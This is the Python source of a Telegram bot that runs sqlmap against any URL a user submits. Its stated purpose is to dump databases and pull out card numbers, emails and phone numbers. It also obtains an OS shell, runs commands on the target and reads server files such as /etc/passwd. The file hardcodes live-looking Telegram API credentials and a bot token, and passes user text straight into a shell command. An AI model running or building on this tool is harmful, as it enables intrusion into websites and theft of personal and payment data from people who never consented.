#!/data/data/com.termux/files/usr/bin/python3
"""
🔥 TIMEX AI - SQLMAP FULL POWER (FAST) 🔥
👑 CREATOR: @timex4sure
💀 ALL SQLMAP FEATURES + FAST
"""

import asyncio
import subprocess
import re
import os
import sys
import json
import sqlite3
import time
from datetime import datetime
from telethon import TelegramClient, events, Button

# ============================================
# CONFIG
# ============================================
API_ID = 36042832
API_HASH = "6dbff02d4cacd9f4dcbe9f7c467d8379"
BOT_TOKEN = "8887761431:AAETYtlG76gBQ8KIY7ODNADPg6xH4rkyJtc"
OWNER = "timex4sure"
OWNER_ID = 7263577562

# ============================================
# DATABASE
# ============================================
def init_db():
    conn = sqlite3.connect('timex.db')
    conn.execute('''CREATE TABLE IF NOT EXISTS scans (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        target TEXT, result TEXT, time TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )''')
    conn.execute('''CREATE TABLE IF NOT EXISTS dumps (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        target TEXT, data TEXT, time TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )''')
    conn.commit()
    conn.close()
    print("✅ DB ready")

# ============================================
# SQLMAP - ALL FEATURES (FAST)
# ============================================

class SQLMAP:
    def __init__(self):
        self.results = {}
        self.output = ""
    
    def run(self, url, options=""):
        """Run SQLMAP with any options"""
        cmd = f"sqlmap -u {url} {options} --batch --random-agent --threads=10 --output-dir=./output/"
        print(f"🔧 Running: {cmd}")
        
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=120)
            self.output = result.stdout + result.stderr
            return self.output
        except subprocess.TimeoutExpired:
            return "⏳ SQLMAP TIMEOUT - Scan taking too long"
        except Exception as e:
            return f"❌ Error: {str(e)}"
    
    def parse_output(self, output):
        """Parse SQLMAP output"""
        results = {
            'vulnerable': False,
            'database': None,
            'tables': [],
            'columns': [],
            'data': [],
            'error': None
        }
        
        if "vulnerable" in output.lower() or "parameter" in output.lower():
            results['vulnerable'] = True
        
        db_match = re.search(r"Database:\s+(\S+)", output)
        if db_match:
            results['database'] = db_match.group(1)
        
        tables = re.findall(r"\| (\w+) \|", output)
        if tables:
            results['tables'] = tables
        
        cc_pattern = r'\b\d{15,16}\b'
        cc_matches = re.findall(cc_pattern, output)
        if cc_matches:
            results['data'].extend(cc_matches)
        
        email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
        email_matches = re.findall(email_pattern, output)
        if email_matches:
            results['data'].extend(email_matches)
        
        phone_pattern = r'\b\d{10}\b'
        phone_matches = re.findall(phone_pattern, output)
        if phone_matches:
            results['data'].extend(phone_matches)
        
        return results
    
    # ============================================
    # ALL SQLMAP COMMANDS
    # ============================================
    
    # 1. SCAN - Find SQLi
    def scan(self, url):
        output = self.run(url, "--dbs")
        return self.parse_output(output)
    
    # 2. DUMP - Extract All Data
    def dump(self, url):
        output = self.run(url, "--dump --threads=10")
        return self.parse_output(output)
    
    # 3. DUMP SPECIFIC - Extract CC, Emails, Phones
    def dump_data(self, url, db=None, table=None):
        options = "--dump"
        if db:
            options += f" -D {db}"
        if table:
            options += f" -T {table}"
        output = self.run(url, options)
        return self.parse_output(output)
    
    # 4. SCHEMA - All Tables
    def schema(self, url):
        output = self.run(url, "--schema")
        return self.parse_output(output)
    
    # 5. OS SHELL
    def os_shell(self, url):
        output = self.run(url, "--os-shell")
        return self.parse_output(output)
    
    # 6. OS CMD
    def os_cmd(self, url, cmd):
        output = self.run(url, f"--os-cmd={cmd}")
        return self.parse_output(output)
    
    # 7. FILE READ
    def file_read(self, url, file_path):
        output = self.run(url, f"--file-read={file_path}")
        return self.parse_output(output)
    
    # 8. WAF DETECT
    def waf_detect(self, url):
        output = self.run(url, "--identify-waf")
        return self.parse_output(output)
    
    # 9. TAMPER
    def tamper(self, url, tamper_script):
        output = self.run(url, f"--tamper={tamper_script}")
        return self.parse_output(output)
    
    # 10. DEEP SCAN (Level 5)
    def deep_scan(self, url):
        output = self.run(url, "--level=5 --risk=3")
        return self.parse_output(output)
    
    # 11. FAST SCAN (Threads 20)
    def fast_scan(self, url):
        output = self.run(url, "--threads=20")
        return self.parse_output(output)
    
    # 12. FULL AUTO
    def full_auto(self, url):
        results = {
            'scan': self.scan(url),
            'dump': self.dump(url),
            'schema': self.schema(url),
            'waf': self.waf_detect(url)
        }
        return results

# ============================================
# TELEGRAM BOT
# ============================================

print("🚀 Starting TIMEX AI - SQLMAP FULL POWER...")

bot = TelegramClient('timex_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
sqlmap = SQLMAP()

@bot.on(events.NewMessage(pattern='/start'))
async def start_handler(event):
    buttons = [
        [Button.inline("🚀 FULL AUTO", b"full")],
        [Button.inline("💉 SQLI SCAN", b"scan")],
        [Button.inline("📊 DUMP DATA", b"dump")],
        [Button.inline("📊 SCHEMA", b"schema")],
        [Button.inline("💻 OS SHELL", b"oshell")],
        [Button.inline("⚡ FAST SCAN", b"fast")],
        [Button.inline("🔬 DEEP SCAN", b"deep")],
        [Button.inline("🛡️ WAF DETECT", b"waf")],
        [Button.inline("📁 FILE READ", b"fileread")],
        [Button.inline("🆘 HELP", b"help")]
    ]
    
    await event.reply(
        f"🔥 *TIMEX AI - SQLMAP FULL POWER* 🔥\n\n"
        f"👑 *Creator:* @{OWNER}\n"
        f"💀 *ALL SQLMAP FEATURES (FAST)*\n\n"
        f"🚀 FULL AUTO - Everything\n"
        f"💉 SQLI SCAN - Find SQL Injection\n"
        f"📊 DUMP DATA - CC, Emails, Phones\n"
        f"📊 SCHEMA - All Tables\n"
        f"💻 OS SHELL - OS Access\n"
        f"⚡ FAST SCAN - Threads 20\n"
        f"🔬 DEEP SCAN - Level 5\n"
        f"🛡️ WAF DETECT - Detect WAF\n"
        f"📁 FILE READ - Read Files\n\n"
        f"🎁 *FREE FOR EVERYONE*\n"
        f"🔥 *Choose an option:*",
        buttons=buttons,
        parse_mode='md'
    )

@bot.on(events.CallbackQuery)
async def callback_handler(event):
    data = event.data.decode()
    
    if data == 'full':
        await event.edit("🌐 Enter URL: `https://example.com?id=1`", parse_mode='md')
        
        @bot.on(events.NewMessage)
        async def h(msg):
            url = msg.message.text.strip()
            if url:
                await msg.reply(f"🚀 *FULL AUTO SCAN {url}*\n\n⏳ Running...", parse_mode='md')
                results = sqlmap.full_auto(url)
                
                text = f"🚀 *FULL AUTO RESULTS*\n\n"
                text += f"🔍 Target: {url}\n\n"
                
                scan = results['scan']
                text += f"💉 *SCAN:*\n"
                text += f"  Vulnerable: {'✅ YES' if scan['vulnerable'] else '❌ NO'}\n"
                if scan['database']:
                    text += f"  Database: {scan['database']}\n"
                text += "\n"
                
                dump = results['dump']
                text += f"📊 *DUMP:*\n"
                if dump['data']:
                    text += f"  Data Found: {len(dump['data'])}\n"
                    for item in dump['data'][:5]:
                        text += f"  • `{item}`\n"
                else:
                    text += "  No data found\n"
                
                text += f"\n👑 @{OWNER}"
                await msg.reply(text, parse_mode='md', buttons=[[Button.inline("🔙 BACK", b"back")]])
                bot.remove_event_handler(h)
            else:
                await msg.reply("❌ Invalid URL!", buttons=[[Button.inline("🔙 BACK", b"back")]])
                bot.remove_event_handler(h)
    
    elif data == 'scan':
        await event.edit("🌐 Enter URL: `https://example.com?id=1`", parse_mode='md')
        
        @bot.on(events.NewMessage)
        async def h(msg):
            url = msg.message.text.strip()
            if url:
                await msg.reply(f"💉 *SQLMAP SCAN {url}*\n\n⏳ Scanning...", parse_mode='md')
                result = sqlmap.scan(url)
                
                text = f"💉 *SCAN RESULTS*\n\n"
                text += f"🔍 Target: {url}\n"
                text += f"🔴 Vulnerable: {'✅ YES' if result['vulnerable'] else '❌ NO'}\n"
                if result['database']:
                    text += f"🗄️ Database: {result['database']}\n"
                if result['tables']:
                    text += f"📊 Tables: {', '.join(result['tables'][:5])}\n"
                text += f"\n👑 @{OWNER}"
                await msg.reply(text, parse_mode='md', buttons=[[Button.inline("🔙 BACK", b"back")]])
                bot.remove_event_handler(h)
            else:
                await msg.reply("❌ Invalid URL!", buttons=[[Button.inline("🔙 BACK", b"back")]])
                bot.remove_event_handler(h)
    
    elif data == 'dump':
        await event.edit("🌐 Enter URL: `https://example.com?id=1`", parse_mode='md')
        
        @bot.on(events.NewMessage)
        async def h(msg):
            url = msg.message.text.strip()
            if url:
                await msg.reply(f"📊 *SQLMAP DUMP {url}*\n\n⏳ Extracting data...", parse_mode='md')
                result = sqlmap.dump(url)
                
                text = f"📊 *DUMP RESULTS*\n\n"
                text += f"🔍 Target: {url}\n"
                if result['database']:
                    text += f"🗄️ Database: {result['database']}\n"
                if result['tables']:
                    text += f"📊 Tables: {', '.join(result['tables'][:5])}\n"
                if result['data']:
                    text += f"\n💳 *Extracted Data:*\n"
                    for item in result['data'][:10]:
                        text += f"  • `{item}`\n"
                else:
                    text += f"\n❌ No data found"
                text += f"\n\n👑 @{OWNER}"
                await msg.reply(text, parse_mode='md', buttons=[[Button.inline("🔙 BACK", b"back")]])
                bot.remove_event_handler(h)
            else:
                await msg.reply("❌ Invalid URL!", buttons=[[Button.inline("🔙 BACK", b"back")]])
                bot.remove_event_handler(h)
    
    elif data == 'schema':
        await event.edit("🌐 Enter URL: `https://example.com?id=1`", parse_mode='md')
        
        @bot.on(events.NewMessage)
        async def h(msg):
            url = msg.message.text.strip()
            if url:
                await msg.reply(f"📊 *SQLMAP SCHEMA {url}*\n\n⏳ Getting schema...", parse_mode='md')
                result = sqlmap.schema(url)
                
                text = f"📊 *SCHEMA RESULTS*\n\n"
                text += f"🔍 Target: {url}\n"
                if result['tables']:
                    text += f"\n📊 *Tables:*\n"
                    for table in result['tables'][:10]:
                        text += f"  • {table}\n"
                text += f"\n👑 @{OWNER}"
                await msg.reply(text, parse_mode='md', buttons=[[Button.inline("🔙 BACK", b"back")]])
                bot.remove_event_handler(h)
            else:
                await msg.reply("❌ Invalid URL!", buttons=[[Button.inline("🔙 BACK", b"back")]])
                bot.remove_event_handler(h)
    
    elif data == 'oshell':
        await event.edit("🌐 Enter URL: `https://example.com?id=1`", parse_mode='md')
        
        @bot.on(events.NewMessage)
        async def h(msg):
            url = msg.message.text.strip()
            if url:
                await msg.reply(f"💻 *SQLMAP OS SHELL {url}*\n\n⏳ Getting OS access...", parse_mode='md')
                result = sqlmap.os_shell(url)
                
                text = f"💻 *OS SHELL RESULTS*\n\n"
                text += f"🔍 Target: {url}\n"
                text += f"\n📝 Output:\n`{result.get('output', 'Done')[:500]}...`\n\n"
                text += f"👑 @{OWNER}"
                await msg.reply(text, parse_mode='md', buttons=[[Button.inline("🔙 BACK", b"back")]])
                bot.remove_event_handler(h)
            else:
                await msg.reply("❌ Invalid URL!", buttons=[[Button.inline("🔙 BACK", b"back")]])
                bot.remove_event_handler(h)
    
    elif data == 'fast':
        await event.edit("🌐 Enter URL: `https://example.com?id=1`", parse_mode='md')
        
        @bot.on(events.NewMessage)
        async def h(msg):
            url = msg.message.text.strip()
            if url:
                await msg.reply(f"⚡ *SQLMAP FAST SCAN {url}*\n\n⏳ Quick scanning...", parse_mode='md')
                result = sqlmap.fast_scan(url)
                
                text = f"⚡ *FAST SCAN RESULTS*\n\n"
                text += f"🔍 Target: {url}\n"
                text += f"🔴 Vulnerable: {'✅ YES' if result['vulnerable'] else '❌ NO'}\n"
                if result['database']:
                    text += f"🗄️ Database: {result['database']}\n"
                text += f"\n👑 @{OWNER}"
                await msg.reply(text, parse_mode='md', buttons=[[Button.inline("🔙 BACK", b"back")]])
                bot.remove_event_handler(h)
            else:
                await msg.reply("❌ Invalid URL!", buttons=[[Button.inline("🔙 BACK", b"back")]])
                bot.remove_event_handler(h)
    
    elif data == 'deep':
        await event.edit("🌐 Enter URL: `https://example.com?id=1`", parse_mode='md')
        
        @bot.on(events.NewMessage)
        async def h(msg):
            url = msg.message.text.strip()
            if url:
                await msg.reply(f"🔬 *SQLMAP DEEP SCAN {url}*\n\n⏳ Deep scanning...", parse_mode='md')
                result = sqlmap.deep_scan(url)
                
                text = f"🔬 *DEEP SCAN RESULTS*\n\n"
                text += f"🔍 Target: {url}\n"
                text += f"🔴 Vulnerable: {'✅ YES' if result['vulnerable'] else '❌ NO'}\n"
                if result['database']:
                    text += f"🗄️ Database: {result['database']}\n"
                if result['tables']:
                    text += f"📊 Tables: {', '.join(result['tables'][:5])}\n"
                text += f"\n👑 @{OWNER}"
                await msg.reply(text, parse_mode='md', buttons=[[Button.inline("🔙 BACK", b"back")]])
                bot.remove_event_handler(h)
            else:
                await msg.reply("❌ Invalid URL!", buttons=[[Button.inline("🔙 BACK", b"back")]])
                bot.remove_event_handler(h)
    
    elif data == 'waf':
        await event.edit("🌐 Enter URL: `https://example.com`", parse_mode='md')
        
        @bot.on(events.NewMessage)
        async def h(msg):
            url = msg.message.text.strip()
            if url:
                await msg.reply(f"🛡️ *SQLMAP WAF DETECT {url}*\n\n⏳ Detecting WAF...", parse_mode='md')
                result = sqlmap.waf_detect(url)
                
                text = f"🛡️ *WAF DETECT RESULTS*\n\n"
                text += f"🔍 Target: {url}\n"
                text += f"\n📝 Output:\n`{result.get('output', 'Done')[:500]}...`\n\n"
                text += f"👑 @{OWNER}"
                await msg.reply(text, parse_mode='md', buttons=[[Button.inline("🔙 BACK", b"back")]])
                bot.remove_event_handler(h)
            else:
                await msg.reply("❌ Invalid URL!", buttons=[[Button.inline("🔙 BACK", b"back")]])
                bot.remove_event_handler(h)
    
    elif data == 'fileread':
        await event.edit("🌐 Enter URL: `https://example.com?id=1`\n\n📁 Enter file path: `/etc/passwd`", parse_mode='md')
        
        @bot.on(events.NewMessage)
        async def h(msg):
            url = msg.message.text.strip()
            if url:
                await msg.reply(f"📁 *Enter file path to read:*\n\nExample: `/etc/passwd`", parse_mode='md')
                
                @bot.on(events.NewMessage)
                async def file_handler(msg2):
                    file_path = msg2.message.text.strip()
                    if file_path:
                        await msg.reply(f"📁 *SQLMAP FILE READ {url}*\n\n⏳ Reading {file_path}...", parse_mode='md')
                        result = sqlmap.file_read(url, file_path)
                        
                        text = f"📁 *FILE READ RESULTS*\n\n"
                        text += f"🔍 Target: {url}\n"
                        text += f"📄 File: {file_path}\n"
                        text += f"\n📝 Output:\n`{result.get('output', 'Done')[:500]}...`\n\n"
                        text += f"👑 @{OWNER}"
                        await msg.reply(text, parse_mode='md', buttons=[[Button.inline("🔙 BACK", b"back")]])
                        bot.remove_event_handler(file_handler)
                    else:
                        await msg.reply("❌ Invalid file path!", buttons=[[Button.inline("🔙 BACK", b"back")]])
                        bot.remove_event_handler(file_handler)
                
                bot.remove_event_handler(h)
            else:
                await msg.reply("❌ Invalid URL!", buttons=[[Button.inline("🔙 BACK", b"back")]])
                bot.remove_event_handler(h)
    
    elif data == 'help':
        await event.edit(
            f"🆘 *TIMEX AI - SQLMAP COMMANDS*\n\n"
            f"🚀 **FULL AUTO** - Everything\n"
            f"💉 **SQLI SCAN** - Find SQL Injection\n"
            f"📊 **DUMP DATA** - CC, Emails, Phones\n"
            f"📊 **SCHEMA** - All Tables\n"
            f"💻 **OS SHELL** - OS Access\n"
            f"⚡ **FAST SCAN** - Threads 20\n"
            f"🔬 **DEEP SCAN** - Level 5\n"
            f"🛡️ **WAF DETECT** - Detect WAF\n"
            f"📁 **FILE READ** - Read Files\n\n"
            f"👑 @{OWNER}",
            buttons=[[Button.inline("🔙 BACK", b"back")]],
            parse_mode='md'
        )
    
    elif data == 'back':
        await start_handler(event)

# ============================================
# MAIN
# ============================================

async def main():
    init_db()
    print("="*60)
    print("🔥 TIMEX AI - SQLMAP FULL POWER 🔥")
    print("="*60)
    print("👑 Creator: @timex4sure")
    print("💀 ALL SQLMAP FEATURES")
    print("🚀 FAST + ALL FEATURES")
    print("="*60)
    print("🚀 Bot is running!")
    print("="*60)
    
    await bot.run_until_disconnected()

if __name__ == "__main__":
    try:
        import nest_asyncio
        nest_asyncio.apply()
    except:
        pass
    
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n👋 Stopped")
    except Exception as e:
        print(f"❌ Error: {e}")